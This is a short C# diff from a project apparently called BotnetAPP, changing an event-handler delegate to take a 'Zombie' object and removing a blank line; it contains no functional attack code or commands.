@@ -3,7 +3,7 @@ using BotnetAPP.Shared ;
 
 namespace BotnetAPP.Network {
 
-    public delegate void EventConnectionHandler(object source);
+    public delegate void EventConnectionHandler(Zombie zombie);
 
     public class EventConnection : EventArgs {
         private string EventInfo;
@@ -15,6 +15,5 @@ namespace BotnetAPP.Network {
         {
             return EventInfo;
         }
-
     }
 }
